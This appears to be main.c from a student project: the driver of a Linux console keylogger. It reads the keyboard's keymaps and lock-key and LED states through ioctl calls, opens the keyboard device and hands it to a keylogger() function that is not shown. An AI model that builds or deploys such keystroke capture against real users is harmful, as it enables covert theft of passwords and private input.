/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: root </var/mail/root>                      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/09/28 05:57:11 by root              #+#    #+#             */
/*   Updated: 2018/10/31 18:37:48 by root             ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <linux/kd.h>
#include <errno.h>
#include <string.h>

#include "main.h"

static int			**new_keymaps()
{
	int				**ret;

	ret = malloc(sizeof(*ret) * 3);
	if (ret == NULL)
		return NULL;
	ret[0] = malloc(sizeof(**ret) * MAX_NR_KEYMAPS);
	if (ret[0] == NULL) {
		free(ret);
		return NULL;
	}
	ret[1] = malloc(sizeof(**ret) * MAX_NR_KEYMAPS);
	if (ret[1] == NULL) {
		free(ret[0]);
		free(ret);
		return NULL;
	}
	ret[2] = NULL;
	return ret;
}

static void 		free_tab(int ***tab)
{
	int				**ptr;

	if (tab && *tab)
	{
		ptr = *tab;
		while (*ptr)
			free(*ptr++);
		free(*tab);
		*tab = NULL;
	}
}

static int			has_keys(int fd, int n)
{
	struct kbentry	ke;

	ke.kb_table = 0;
	ke.kb_index = n;
	return !ioctl(fd, KDGKBENT, (unsigned long)&ke);
}

static void			get_keystate(int fd, int *caps, int *num)
{
	long int		state;

	state = 0;
	if (ioctl(fd, KDGKBLED, &state)) {
		fprintf(stderr, "Can't get keys state: %s\n", strerror(errno));
		return ;
	}
	printf("state: %ld", state);
	for (int i = 0; i < 16; i++)
		printf("%lx", state & i);
	printf("\n");
	printf("\tSCROLLLOCK %s", ((state << 3) & K_SCROLLLOCK) ? "ON":"OFF");
	printf("\tNUMLOCK %s", ((state << 3) & K_NUMLOCK) ? "ON":"OFF");
	printf("\tCAPSLOCK %s\n", ((state << 3) & K_CAPSLOCK) ? "ON":"OFF");
	*caps = state  & K_CAPSLOCK;
	*num = state & K_NUMLOCK;
	state = 0;
	ioctl(fd, KDGETLED, &state);
	printf("state: %ld", state);
	printf("\tSCROLLLED %s", (state & LED_SCR) ? "ON":"OFF");
	printf("\tNUMLED %s", (state & LED_NUM) ? "ON":"OFF");
	printf("\tCAPSLED %s\n", (state & LED_CAP) ? "ON":"OFF");
}

int					main(void)
{
	int				fd;
	int				nb_keys;
	int				**key_maps;
	int 			nb_keymap;
	int				**key_table;
	char			*keyboard;
	int				capslock;
	int				numlock;

	if ((fd = get_console()) < 0)
		return 1;
	nb_keys = (has_keys(fd, 255) ? 256 : has_keys(fd, 127) ? 128 : 112);
	if ((key_maps = new_keymaps()) == NULL)
		return 1;
	if ((nb_keymap = get_keymaps(fd, key_maps)) == 0)
		return 1;
	key_table = get_keys(fd, nb_keys, nb_keymap, key_maps);
	free_tab(&key_maps);
	get_keystate(fd, &capslock, &numlock);
	close(fd);
	if (key_table == NULL)
		return 1;
	if ((keyboard = get_keyboard()) == NULL) {
		free_tab(&key_table);
		return 1;
	}
	if ((fd = open(keyboard, O_RDONLY)) < 0) {
		free(keyboard);
		free_tab(&key_table);
		return 1;
	}
	printf("keyboard: %s\n", keyboard);
	free(keyboard);
	keylogger(fd, key_table, capslock, numlock);
	close(fd);
	free_tab(&key_table);
	return 0;
}
